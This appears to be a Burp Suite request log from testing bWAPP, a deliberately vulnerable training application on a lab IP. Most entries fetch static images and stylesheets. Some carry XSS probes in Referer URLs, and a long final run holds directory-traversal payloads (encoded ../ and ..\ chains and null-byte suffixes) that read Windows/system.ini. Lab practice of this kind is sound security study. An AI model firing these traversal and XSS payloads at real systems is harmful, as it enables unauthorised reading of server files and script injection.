+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p2mj8n4g0tmto4tsn7t5tiu4a3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=2of2uacdjqu4i9fob3lttmhdb1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt?name=abc
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt?name=abc
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt?name=abc
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt?name=abc
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=message.txt?name=abc
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=javascript:alert(1)
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=javascript:alert(1)
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=javascript:alert(1)
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=javascript:alert(1)
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/directory_traversal_1.php?page=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E
+Cookie: PHPSESSID=a2jb7tuc89rlskksm03j0i3jg3
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/2774042299192175540.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/5926373630516102370 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/js/4212054568103205647 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/xss_post.php
+Sec-Fetch-Dest: script
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/7006147394623966678 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/xss_post.php
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=c%3A%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=Windows%2Fsystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=Windows%2Fsystem.ini%00 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=Windows%2Fsystem.ini%00.txt HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=Windows%5Csystem.ini HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
